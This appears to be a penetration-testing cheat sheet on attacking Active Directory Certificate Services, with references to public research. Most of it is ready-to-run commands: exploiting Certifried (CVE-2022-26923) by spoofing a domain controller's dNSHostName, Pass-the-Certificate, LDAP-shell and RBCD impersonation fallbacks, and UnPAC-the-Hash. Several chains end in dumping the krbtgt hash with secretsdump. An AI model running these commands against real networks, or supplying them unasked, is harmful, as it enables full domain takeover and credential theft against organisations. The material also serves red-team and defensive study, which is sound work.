# Active Directory - Certificate Services

Active Directory Certificate Services (AD CS) is a Microsoft Windows server role that provides a public key infrastructure (PKI). It allows you to create, manage, and distribute digital certificates, which are used to secure communication and transactions across a network.

## ADCS Enumeration

* NetExec:

    ```ps1
    netexec ldap domain.lab -u username -p password -M adcs
    ```

* ldapsearch:

    ```ps1
    ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName
    ```

* certutil:

    ```ps1
    certutil.exe -config - -ping
    certutil -dump
    ```

## Certificate Enrollment

* DNS required (`CT_FLAG_SUBJECT_ALT_REQUIRE_DNS` or `CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS`): only principals with their `dNSHostName` attribute set can enroll.
    * Active Directory Users cannot enroll in certificate templates requiring `dNSHostName`.
    * Computers will get their `dNSHostName` attribute set when you **domain-join** a computer, but the attribute is null if you simply create a computer object in AD.
    * Computers have validated write to their `dNSHostName` attribute meaning they can add a DNS name matching their computer name.

* Email required (`CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL` or `CT_FLAG_SUBJECT_REQUIRE_EMAIL`): only principals with their `mail` attribute set can enroll unless the template is of schema version 1.
    * By default, users and computers do not have their `mail` attribute set, and they cannot modify this attribute themselves.
    * Users might have the `mail` attribute set, but it is rare for computers.

## Certifried CVE-2022-26923

> An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.

* Find `ms-DS-MachineAccountQuota`

  ```ps1
  bloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 get object 'DC=lab,DC=local' --attr ms-DS-MachineAccountQuota 
  ```

* Add a new computer in the Active Directory, by default `MachineAccountQuota = 10`

  ```ps1
  bloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 add computer cve 'CVEPassword1234*'
  certipy account create 'lab.local/username:Password123*@dc.lab.local' -user 'cve' -dns 'dc.lab.local'
  ```

* [ALTERNATIVE] If you are `SYSTEM` and the `MachineAccountQuota=0`: Use a ticket for the current machine and reset its SPN

  ```ps1
  Rubeus.exe tgtdeleg
  export KRB5CCNAME=/tmp/ws02.ccache
  bloodyAD -d lab.local -u 'ws02$' -k --host dc.lab.local set object 'CN=ws02,CN=Computers,DC=lab,DC=local' servicePrincipalName
  ```

* Set the `dNSHostName` attribute to match the Domain Controller hostname

  ```ps1
  bloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 set object 'CN=cve,CN=Computers,DC=lab,DC=local' dNSHostName -v DC.lab.local
  bloodyAD -d lab.local -u username -p 'Password123*' --host 10.10.10.10 get object 'CN=cve,CN=Computers,DC=lab,DC=local' --attr dNSHostName
  ```

* Request a ticket

  ```ps1
  # certipy req 'domain.local/cve$:CVEPassword1234*@ADCS_IP' -template Machine -dc-ip DC_IP -ca discovered-CA
  certipy req 'lab.local/cve$:CVEPassword1234*@10.100.10.13' -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA
  ```

* Either use the pfx or set a RBCD on your machine account to takeover the domain

  ```ps1
  certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10

  openssl pkcs12 -in dc.pfx -out dc.pem -nodes
  bloodyAD -d lab.local  -c ":dc.pem" -u 'cve$' --host 10.10.10.10 add rbcd 'CRASHDC$' 'CVE$'
  getST.py -spn LDAP/CRASHDC.lab.local -impersonate Administrator -dc-ip 10.10.10.10 'lab.local/cve$:CVEPassword1234*'   
  secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt 'lab.local/Administrator@dc.lab.local' -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10 
  ```

## Pass-The-Certificate

> Pass the Certificate in order to get a TGT, this technique is used in "UnPAC the Hash" and "Shadow Credential"

* Windows

  ```ps1
  # Information about a cert file
  certutil -v -dump admin.pfx

  # From a Base64 PFX
  Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:cert.pfx /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show

  # Grant DCSync rights to an user
  ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --sid <user_SID>
  # To restore
  ./PassTheCert.exe --server dc.domain.local --cert-path C:\cert.pfx --elevate --target "DC=domain,DC=local" --restore restoration_file.txt
  ```

* Linux

  ```ps1
  # Base64-encoded PFX certificate (string) (password can be set)
  gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
  ​
  # PEM certificate (file) + PEM private key (file)
  gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

  # PFX certificate (file) + password (string, optionnal)
  gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

  # Using Certipy
  certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
  certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"
  ```

### PKINIT ERROR

When the DC does not support **PKINIT** (the pre-authentication allowing to retrieve either TGT or NT Hash using certificate). You will get an error like the following in the tool's output.

```ps1
$ certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
[...]
KDC_ERROR_CLIENT_NOT_TRUSTED (Reserved for PKINIT)
```

There is still a way to use the certificate to takeover the account.

* Open an LDAP shell using the certificate

    ```ps1
    certipy auth -pfx target.pfx -debug -username username -domain domain.local -dns-tcp -dc-ip 10.10.10.10 -ldap-shell
    ```

* Add a computer for RBCD

    ```ps1
    impacket-addcomputer -dc-ip 10.10.10.10 DOMAIN.LOCAL/User:P@ssw0rd -computer-name "NEWCOMPUTER" -computer-pass "P@ssw0rd123*"
    ```

* Set the RBCD

    ```ps1
    set_rbcd 'TARGET$' 'NEWCOMPUTER$'
    ```

* Request a ticket with impersonation

    ```ps1
    impacket-getST -spn 'cifs/target.domain.local' -impersonate 'target$' -dc-ip 10.10.10.10 'DOMAIN.LOCAL/NEWCOMPUTER$:P@ssw0rd123*'
    ```

* Use the ticket

    ```ps1
    export KRB5CCNAME=DC$.ccache
    impacket-secretsdump.py 'target$'@target.domain.local -k -no-pass -dc-ip 10.10.10.10 -just-dc-user 'krbtgt'
    ```

## UnPAC The Hash

Using the **UnPAC The Hash** method, you can retrieve the NT Hash for an User via its certificate.

* [ly4k/Certipy](https://github.com/ly4k/Certipy)

  ```ps1
  export KRB5CCNAME=/pwd/to/user.ccache
  proxychains certipy req -username "user@domain.lab" -ca "domain-DC-CA" -target "dc1.domain.lab" -template User -k -no-pass -dns-tcp -ns 10.10.10.10 -dc-ip 10.10.10.10
  proxychains certipy auth -pfx 'user.pfx' -dc-ip 10.10.10.10 -username user -domain domain.lab
  ```

* [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

  ```ps1
  # Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC.
  Rubeus.exe asktgt /getcredentials /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
  ```

* [dirkjanm/PKINITtools](https://github.com/dirkjanm/PKINITtools)

  ```ps1
  # Obtain a TGT by validating a PKINIT pre-authentication
  gettgtpkinit.py -cert-pfx "PATH_TO_CERTIFICATE" -pfx-pass "CERTIFICATE_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
  
  # Use the session key to recover the NT hash
  export KRB5CCNAME="TGT_CCACHE_FILE" getnthash.py -key 'AS-REP encryption key' 'FQDN_DOMAIN'/'TARGET_SAMNAME'
  ```

## Common Error Messages

| Error Name | Description |
| ---------- | ----------- |
| `CERTSRV_E_TEMPLATE_DENIED` | The permissions on the certificate template do not allow the current user to enroll |
| `KDC_ERR_INCONSISTENT_KEY_PURPOSE` | Certificate cannot be used for PKINIT client authentication |
| `KDC_ERROR_CLIENT_NOT_TRUSTED` | Reserved for PKINIT. Try to authenticate to another DC |
| `KDC_ERR_PADATA_TYPE_NOSUPP` | KDC has no support for padata type. CA might be expired |

`KDC_ERR_PADATA_TYPE_NOSUPP` error still allow the attacker to use the certificate with the Pass-The-Cert. Since the DC's LDAPS service only check the SAN.

## References

* [Access controls - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/access-controls)
* [AD CS Domain Escalation - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#shell-access-to-adcs-ca-with-yubihsm-esc12)
* [ADCS Attack Paths in BloodHound — Part 2 - Jonas Bülow Knudsen - May 1, 2024](https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-2-ac7f925d1547)
* [bloodyAD and CVE-2022-26923 - soka - 11 May 2022](https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html)
* [CA configuration - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/ca-configuration)
* [Certificate templates - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/certificate-templates)
* [Certificates and Pwnage and Patches, Oh My! - Will Schroeder - Nov 9, 2022](https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d)
* [Certified Pre-Owned - Will Schroeder - Jun 17 2021](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
* [Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021](http://www.harmj0y.net/blog/activedirectory/certified-pre-owned/)
* [Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_](https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Certified-Pre-Owned-Abusing-Active-Directory-Certificate-Services.pdf)
* [Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) - Oliver Lyak](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
* [Diving Into AD CS: Exploring Some Common Error Messages - Jacques Coertze - March 7, 2025](https://sensepost.com/blog/2025/diving-into-ad-cs-exploring-some-common-error-messages/)
* [Microsoft ADCS – Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021](https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/)
* [UnPAC the hash - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash)
* [Web endpoints - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/web-endpoints)
